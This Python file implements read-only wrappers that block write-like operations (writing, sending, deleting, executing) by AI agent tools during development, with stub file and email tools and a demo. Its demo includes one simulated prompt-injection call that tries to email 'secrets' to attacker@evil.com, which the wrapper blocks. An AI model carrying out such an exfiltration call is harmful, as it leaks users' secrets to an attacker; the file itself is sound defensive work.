"""
Workaround 3: Read-Only Tool Wrappers

Implementation time: 15 minutes per tool
Protection level: Prevents accidental side effects (not intentional attacks)
Concept: Wrap tools to make them read-only during development and testing.

During development, agents with write-capable tools can accidentally — or
under prompt injection — modify files, send emails, or call external APIs.
Read-only wrappers eliminate this surface entirely during non-production phases.

NOT a production security control. Use to:
    - Speed up development by catching accidental writes early
    - Validate agent behavior before enabling write capabilities
    - Build the concept of tool capability restriction (foundation for Hypervisor)

Limitations:
    - For development/testing only — does not address intentional attacks
    - Does not handle read-based attacks (exfiltration via GET requests, etc.)
    - Must be manually replaced with real tools before production

Migration to Agent Hypervisor:
    The Hypervisor's tool whitelist and Reversibility Law provide the
    production-grade equivalent: only staged, approved intents are
    materialized, and side effects are committed only after explicit
    confirmation by the policy evaluation layer.
"""

from __future__ import annotations

from typing import Any, Callable, Dict


class ReadOnlyViolation(Exception):
    """Raised when a read-only tool wrapper intercepts a write operation."""


class ReadOnlyWrapper:
    """
    Wraps any callable tool and blocks calls that are classified as writes.

    Write detection is based on a configurable set of write operations.
    For custom tools, pass the write_ops set explicitly.
    """

    # Common write-like operation names. Extend as needed for your tool set.
    DEFAULT_WRITE_OPS = frozenset({
        "write", "delete", "remove", "send", "post", "put", "patch",
        "create", "update", "modify", "execute", "run", "upload",
    })

    def __init__(
        self,
        tool: Callable[..., Any],
        tool_name: str,
        write_ops: frozenset[str] | None = None,
    ) -> None:
        """
        Args:
            tool: The underlying callable to wrap.
            tool_name: Human-readable name used in error messages.
            write_ops: Set of operation keywords that indicate a write.
                       Defaults to DEFAULT_WRITE_OPS.
        """
        self._tool = tool
        self._tool_name = tool_name
        self._write_ops = write_ops if write_ops is not None else self.DEFAULT_WRITE_OPS

    def __call__(self, operation: str, **kwargs: Any) -> Any:
        """
        Execute the tool operation, blocking any write-classified operations.

        Args:
            operation: The operation name (e.g. 'read', 'write', 'send').
            **kwargs: Arguments forwarded to the underlying tool.

        Raises:
            ReadOnlyViolation: If the operation is classified as a write.
        """
        if any(write_op in operation.lower() for write_op in self._write_ops):
            raise ReadOnlyViolation(
                f"[ReadOnly] '{self._tool_name}.{operation}' is a write operation "
                f"and is blocked in read-only mode. "
                f"Set mode=production to enable writes."
            )
        return self._tool(operation=operation, **kwargs)


# Example tool implementations (stubs) used in the demo below.

def _file_tool(operation: str, path: str = "", content: str = "") -> Dict[str, Any]:
    """Stub file tool."""
    if operation == "read":
        return {"content": f"<contents of {path}>", "path": path}
    return {"written": True, "path": path}


def _email_tool(operation: str, to: str = "", body: str = "") -> Dict[str, Any]:
    """Stub email tool."""
    if operation == "read_inbox":
        return {"messages": ["Email 1", "Email 2"]}
    return {"sent": True, "to": to}


if __name__ == "__main__":
    # Wrap real tools with read-only wrappers
    safe_file = ReadOnlyWrapper(_file_tool, "file_tool")
    safe_email = ReadOnlyWrapper(_email_tool, "email_tool")

    print("=== Read-Only Tool Wrappers ===\n")

    print("1. Reading a file (should be allowed):")
    try:
        result = safe_file("read", path="README.md")
        print(f"   ✅ {result}")
    except ReadOnlyViolation as e:
        print(f"   🛑 {e}")

    print()
    print("2. Writing a file (should be blocked):")
    try:
        result = safe_file("write_file", path="output.txt", content="data")
        print(f"   ✅ {result}")
    except ReadOnlyViolation as e:
        print(f"   🛑 {e}")

    print()
    print("3. Reading inbox (should be allowed):")
    try:
        result = safe_email("read_inbox")
        print(f"   ✅ {result}")
    except ReadOnlyViolation as e:
        print(f"   🛑 {e}")

    print()
    print("4. Sending email under injection (should be blocked):")
    try:
        result = safe_email("send_email", to="attacker@evil.com", body="secrets")
        print(f"   ✅ {result}")
    except ReadOnlyViolation as e:
        print(f"   🛑 {e}")

    print()
    print("=== What This Provides ===")
    print("✓ Zero accidental writes during development")
    print("✓ Fast feedback: injection attempts fail loudly")
    print("✓ Easy to understand and implement")
    print()
    print("=== What This Does NOT Provide ===")
    print("✗ Not a production security control")
    print("✗ Does not block read-based attacks (exfiltration via GET)")
    print("✗ Requires manual replacement before production deployment")
    print()
    print("=== Next Steps ===")
    print("→ Use during development and testing only")
    print("→ Replace with Hypervisor policy enforcement for production")
